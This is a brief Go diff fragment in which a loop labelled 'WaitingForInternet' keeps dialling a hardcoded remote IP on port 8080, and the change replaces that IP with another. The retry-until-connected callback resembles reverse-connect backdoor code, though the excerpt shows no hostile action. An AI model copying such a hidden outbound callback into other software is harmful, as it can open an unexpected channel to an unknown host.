@@ -33,7 +33,7 @@ func handleRequest(conn net.Conn) {
 	//Wait until connected to Internet
 WaitingForInternet:
 	for {
-		conn, err := net.Dial("tcp", "13.93.181.35:8080")
+		conn, err := net.Dial("tcp", "13.91.38.239:8080")
 		if err != nil {
 			continue
 		} else {
